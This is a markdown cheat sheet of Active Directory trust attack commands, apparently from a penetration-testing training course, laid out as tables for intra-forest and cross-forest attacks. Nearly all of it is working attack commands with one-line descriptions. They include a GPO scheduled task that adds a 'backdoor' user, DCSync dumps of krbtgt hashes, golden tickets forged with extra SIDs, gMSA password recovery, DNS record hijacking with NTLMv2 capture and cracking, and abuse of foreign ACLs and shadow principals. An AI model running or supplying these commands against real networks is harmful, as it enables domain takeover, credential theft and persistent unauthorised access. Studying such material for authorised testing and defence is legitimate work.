# AD Trust Attacks

## Enumeration & Mapping

|Command|Description|
|---|---|
|`Import-Module activedirectory`|Load the Active Directory (AD) PowerShell module.|
|`Get-ADTrust -Filter *`|Enumerate Active Directory trusts for current domain using the built-in AD PowerShell module.|
|`Get-DomainTrust`|Enumerate trusts for the current domain using PowerView.|
|`Get-DomainTrustMapping`|Enumerate **all** trusts for the current domain along with all trusts for each domain that is found in the process.|
|`.\Adalanche.exe collect activedirectory --domain example.ad`|Using the Adalanche tool to map Active Directory.|
|`(objectClass=trustedDomain)`|Query in Adalanche GUI to view all trusts within the collected data.|

## Intra Forest Attacks

|Command|Description|
|---|---|
|`.\Rubeus.exe monitor /interval:5 /nowrap`|Monitor Kerberos tickets using Rubeus.|
|`.\SpoolSample.exe dc01.example.ad dc02.dev.example.ad`|Abusing the Printer Bug flaw.|
|`.\Rubeus.exe renew /ticket:doIFvDCCBbigAwIBQNUp/nYxdZNM8CtNv...SNIP... /ptt`|Obtaining a valid TGT ticket in memory using the `renew` option in Rubeus.|
|`$dn = "CN=Configuration,DC=example,DC=AD"`  <br>`$acl = Get-Acl -Path "AD:\$dn"`  <br>`$acl.Access \| Where-Object {$_.ActiveDirectoryRights -match "GenericAll\|Write" }`|Enumerate ACL's for WRITE access on Configuration Naming Context.|
|`.\Certify.exe request /ca:example.ad\example-DC01-CA /domain:example.ad /template:"Copy of User" /altname:example\Administrator`|Request a ticket using Certify.|
|`.\Rubeus.exe asktgt /domain:example.ad /user:Administrator /certificate:cert.pfx /ptt`|Request a TGT ticket.|
|`$gpo = "Backdoor"`  <br>`New-GPO $gpo`|Create new GPO.|
|`New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user backdoor B@ckdoor123 /add"`|Create a scheduled task inside a GPO that adds a new user.|
|`Get-ADDomainController -Server example.ad \| Select ServerObjectDN`|Retrieve the replication site of the root domain controller.|
|`$sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=example,DC=AD"`  <br>`New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.example.ad`|Link the GPO to the default site as SYSTEM.|
|`New-ADServiceAccount -Name "apache-dev" -DNSHostName "example.ad" -PrincipalsAllowedToRetrieveManagedPassword htb-student-1 -Enabled $True`|Create new gMSA account.|
|`.\GoldenGMSA.exe gmsainfo --domain example.ad`|Enumerate gMSA.|
|`\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --forest dev.example.ad --domain example.ad`|Retrieve gMSA password.|
|`.\GoldenGMSA.exe gmsainfo --domain example.ad`|Retrieve msds-ManagedPasswordID.|
|`.\GoldenGMSA.exe kdsinfo --forest dev.example.ad`|Retrieve kdsinfo.|
|`.\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --kdskey AQAAAAwsk<SNIP>`|Compute the gMSA Password Manually.|
|`import base64`  <br>  <br>`import hashlib`  <br>  <br>  <br>`base64_input = "WITSKRtGah<SNIP>=`"   <br>  <br>  <br>`print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())`|Convert password to NT hash.|
|`Resolve-DNSName TEST1.example.ad`|Resolve non-existing DNS Name.|
|`Import-module Powermad.ps1`  <br>`New-ADIDNSNode -Node * -domainController DC01.example.ad -Domain example.ad -Zone example.ad -Tombstone -Verbose`|Add wildcard DNS record.|
|`Get-DnsServerResourceRecord -ComputerName DC01.example.ad -ZoneName example.ad -Name "@"`|Enumerate DNS records in parent domain.|
|`Resolve-DnsName -Name DEV01.example.ad -Server DC01.example.AD`|Enumerate DNS Record for DEV01|
|`$Old = Get-DnsServerResourceRecord -ComputerName DC01.example.AD -ZoneName example.ad -Name DEV01`  <br>  <br>`$New = $Old.Clone()`  <br>  <br>`$TTL = [System.TimeSpan]::FromSeconds(1)`  <br>  <br>`$New.TimeToLive = $TTL`  <br>  <br>`$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')`  <br>  <br>`Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName DC01.example.AD -ZoneName example.ad`  <br>  <br>`Get-DnsServerResourceRecord -ComputerName DC01.example.ad -ZoneName example.ad -Name "@"`|Modify DNS Record for DEV01.|
|`Resolve-DnsName -Name DEV01.example.ad -Server DC01.example.AD`|Verify the IP change for DEV01.|
|`Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y`|Start Inveigh for hash interception.|
|`hashcat -m 5600 buster_ntlmv2 /usr/share/wordlists/rockyou.txt`|Crack NTLMv2 hash with Hashcat.|
|`Get-DomainForeignUser`|Enumerate users that belong to groups within the parent domain.|
|`Get-DomainGroup -Identity 'example_admins' -domain example.ad`|Gather additional info on the example_admins group.|
|`./Rubeus createnetonly /program:powershell.exe /show`|Create a sacrificial logon session with Rubeus.|
|`Import-Module .\PowerView.ps1`  <br>  <br>`$SecPassword = ConvertTo-SecureString 'T3st@123' -AsPlainText -Force`  <br>  <br>`New-DomainUser -Domain example.ad -SamAccountName testuser -AccountPassword $SecPassword`|Create a new domain user in parent domain.|
|`Add-ADGroupMember -identity "DNSAdmins" -Members testuser -Server example.ad`|Add the created user into DNSAdmins Group.|
|`$sid = Convert-NameToSid rita`  <br>  <br>`Get-DomainObjectAcl -ResolveGUIDs -Identity * -domain example.ad &#124 ? {$_.SecurityIdentifier -eq $sid}`|Enumerate ACLs for Rita.|
|`Add-DomainGroupMember -identity 'Infrastructure' -Members 'DEV\rita' -Domain example.ad -Verbose`|Add Rita to Infrastructure group.|
|`Get-DomainGroupMember -Identity 'Infrastructure' -Domain example.ad -Verbose`|Confirm group membership.|
|`$Domain = "example.ad"`  <br>`$DomainSid = Get-DomainSid $Domain`  <br>`Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * \| ? {`   <br>    `($_.ActiveDirectoryRights -match 'WriteProperty\|GenericAll\|GenericWrite\|WriteDacl\|WriteOwner') -and` `   <br>    `($_.AceType -match 'AccessAllowed') -and` `   <br>    `($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and` `  <br>    `($_.SecurityIdentifier -notmatch $DomainSid)`  <br>`}`|Enumerate Foreign ACLs for all users.|
|`ConvertFrom-SID S-1-5-21-2901893446-2198612369-2488268719-2103`|Convert SID to username with PowerView.|
|`.\Whisker.exe add /target:DC01$ /domain:example.ad`|Add credentials on the msDS-KeyCredentialLink attribute.|
|`.\Rubeus.exe s4u /dc:DC01.example.ad /ticket:dot0YBOM<SNIP>== /impersonateuser:administrator@example.ad /ptt /self /service:host/DC01.example.ad /altservice:cifs/DC01.example.ad`|Perform S4U2self request to impersonate the Administrator account.|
|`.\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit`|Obtain KRBTGT hash for the child domain.|
|`Get-DomainSID`|Obtain SID of domain.|
|`Get-ADGroup -Identity "Enterprise Admins" -Server "example.ad"`|Obtain Enterprise Admins SID from parent domain.|
|`.\Rubeus.exe golden /rc4:992093609707726257e0959ce3e23771 /domain:dev.example.ad /sid:S-1-5-21-2901893446-2198612369-2488268719 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt`|Create Golden Ticket using Rubeus.|
|`mimikatz # kerberos::golden /user:htb-student /domain:dev.example.ad /sid:S-1-5-21-2901893446-2198612369-2488268719 /krbtgt:992093609707726257e0959ce3e23771 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /ptt`|Create Golden Ticket using Mimikatz.|
|`klist`|Verify ticket in memory.|
|`secretsdump.py dev.example.ad/Administrator:'HTB_@cademy_adm!'@10.129.229.159 -just-dc-user DEV/krbtgt`|Obtain KRBTGT hash for the child domain using Secretsdump.py.|
|`lookupsid.py dev.example.ad/Administrator:'HTB_@cademy_adm!'@10.129.229.159 &#124; grep "Domain SID"`|Obtain SID of domain using lookupsid.py.|
|`ticketer.py -nthash 992093609707726257e0959ce3e23771 -domain dev.example.ad -domain-sid S-1-5-21-2901893446-2198612369-2488268719 -extra-sid S-1-5-21-2879935145-656083549-3766571964-519 htb-student`.|Create Golden Ticket using ticketer.py.|
|`raiseChild.py -target-exe 172.16.210.99 dev.example.ad/htb-student`F|Automating the ExtraSids attack using raisechild.py.|

## Cross Forest Attacks

| Command                                                                                                                                                                                                  | Description                                     |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| `.\Rubeus.exe kerberoast /domain:logistics.ad`                                                                                                                                                           | Kerberoast across forest trust.                 |
| `Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory`                                                                                                                                       | Enumerate users with SIDHistory enabled.        |
| `./Rubeus createnetonly /program:powershell.exe /show`                                                                                                                                                   | Create a sacrificial login session with Rubeus. |
| `Get-DomainTrust -domain logistics.ad \| Where-Object {$_.TargetName -eq "example.ad"} \| Select TrustAttributes`                                                                                  | Retrieve only TrustAttributes for domain.       |
| `.\mimikatz.exe "lsadump::dcsync /user:example\krbtgt" exit`                                                                                                                                       | Obtain KRBTGT hash for the current domain.      |
| `python3 ftinfo.py`                                                                                                                                                                                      | Parse data from `msDS-TrustForestTrustInfo`.    |
| `proxychains python getlocalsid.py example.ad/Administrator@SQL02.logistics.ad SQL02`                                                                                                              | Get LocalSid for SQL server.                    |
| `Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' \| select name,objectguid`                                                                                                                       | Get GUID for target domain.                     |
| `.\mimikatz.exe "lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}" "exit"`                                                                                                                   | Retrieve Inter-realm tickets.                   |
| `Get-SQLServerLink`                                                                                                                                                                                      | Enumerate SQL Server links.                     |
| `Get-SQLQuery -Query "EXEC sp_helplinkedsrvlogin"`                                                                                                                                                       | Enumerate login rights for user.                |
| `mssqlclient.py jimmy@10.129.229.188 -windows-auth`                                                                                                                                                      | Connect to SQL Server using Impacket tools.     |
| `Get-DomainObject -LDAPFilter '(objectclass=ForeignSecurityPrincipal)' -Domain logistics.ad`                                                                                                             | Enumerate foreign security principals.          |
| `Get-DomainObjectAcl -ResolveGUIDs -Identity * -domain logistics.ad \| ? {$_.SecurityIdentifier -eq $sid}`                                                                                               | Enumerate foreign ACL principals.               |
| `Set-DomainUserPassword -identity jessica -AccountPassword $pass -domain logistics.ad -verbose`                                                                                                          | Abuse foreign ACL principals.                   |
| `Set-ADObject -Identity "CN=Tom,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=controlcenter,DC=corp" -Add @{'member'="CN=Administrator,CN=Users,DC=controlcenter,DC=corp"} -Verbose` | Create shadow principal in bastion forest.      |
| `Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * \| select Name,member,msDS-ShadowPrincipalSid \| fl`   | Enumerate shadow principals.                    |